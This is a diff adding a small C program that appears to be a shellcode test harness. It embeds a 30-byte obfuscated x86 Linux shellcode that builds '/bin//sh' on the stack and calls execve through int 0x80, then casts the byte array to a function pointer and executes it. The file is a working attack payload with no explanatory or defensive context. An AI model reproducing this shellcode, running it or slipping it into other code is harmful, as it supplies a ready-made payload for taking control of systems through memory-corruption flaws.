@@ -1,0 +1,18 @@
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x29\xc9\x51\xb9\x2e\x2f\x73\x68\x41\x51\x81\xc1\xff\x32\xf6\x05\x41\x51\x29\xc9\xf7\xe1\xb0\x0c\xfe\xc8\x89\xe3\xcd\x80"; 
+
+main()
+{
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+
+	
